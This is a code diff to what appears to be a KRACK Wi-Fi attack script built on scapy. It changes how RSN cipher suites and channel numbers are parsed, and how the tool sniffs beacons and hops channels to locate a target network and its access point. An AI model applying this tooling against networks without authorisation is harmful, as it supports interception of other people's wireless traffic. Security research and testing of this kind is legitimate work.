@@ -9,7 +9,6 @@ import os, sys
 sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
 from scapy.all import *  # noqa: E402
 from scapy.arch.linux import L2Socket
-#from scapy.arch.bpf.core import attach_filter
 
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -343,18 +342,18 @@ class NetworkConfig():
 
     # TODO: Improved parsing to handle more networks
     def parse_wparsn(self, wparsn):
-        self.group_cipher = wparsn[5]
+        self.group_cipher = ord(wparsn[5])
 
         num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
         pos = wparsn[8:]
         for i in range(num_pairwise):
-            self.pairwise_ciphers.add(pos[3])
+            self.pairwise_ciphers.add(ord(pos[3]))
             pos = pos[4:]
 
         num_akm = struct.unpack("<H", pos[:2])[0]
         pos = pos[2:]
         for i in range(num_akm):
-            self.akms.add(pos[3])
+            self.akms.add(ord(pos[3]))
             pos = pos[4:]
 
         if len(pos) >= 2:
@@ -366,7 +365,7 @@ class NetworkConfig():
             if el.ID == IEEE_TLV_TYPE_SSID:
                 self.ssid = el.info
             elif el.ID == IEEE_TLV_TYPE_CHANNEL:
-                self.real_channel = el.info[0]
+                self.real_channel = ord(el.info[0])
             elif el.ID == IEEE_TLV_TYPE_RSN:
                 self.parse_wparsn(el.info)
                 self.wpavers |= 2
@@ -537,32 +536,23 @@ class KRAckAttack():
         self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
     def find_beacon(self, ssid):
-        beacon_p = None
-        ps = sniff(count=3, timeout=0.3,
-                   lfilter=lambda p: Dot11Beacon in p,
+        ps = sniff(count=1, timeout=0.3,
+                   lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid,
                    opened_socket=self.sock_real)
-        for p in ps:
-            if(get_tlv_value(p, IEEE_TLV_TYPE_SSID).decode() == ssid):
-                beacon_p = p
-                break;
-        if not beacon_p:
+        if ps is None or len(ps) < 1:
             log(STATUS, "Searching for target network on other channels")
             for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
                 self.sock_real.set_channel(chan)
                 log(DEBUG, "Listening on channel %d" % chan)
-                ps = sniff(count=3, timeout=0.3,
-                   lfilter=lambda p: Dot11Beacon in p,
-                   opened_socket=self.sock_real)
-                for p in ps:
-                    if(int.from_bytes(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == chan and get_tlv_value(p, IEEE_TLV_TYPE_SSID).decode() == ssid):
-                        beacon_p = p
-                        break;
+                ps = sniff(count=1, timeout=0.3,
+                           lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid,
+                           opened_socket=self.sock_real)
+                if ps and len(ps) >= 1: break
 
-        if beacon_p:
-            print("Successfully found the target network <%s>'s beacon frame!" % ssid)
-            actual_chan = ord(get_tlv_value(beacon_p, IEEE_TLV_TYPE_CHANNEL))
+        if ps and len(ps) >= 1:
+            actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
             self.sock_real.set_channel(actual_chan)
-            self.beacon = beacon_p
+            self.beacon = ps[0]
             self.apmac = self.beacon.addr2
 
     def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
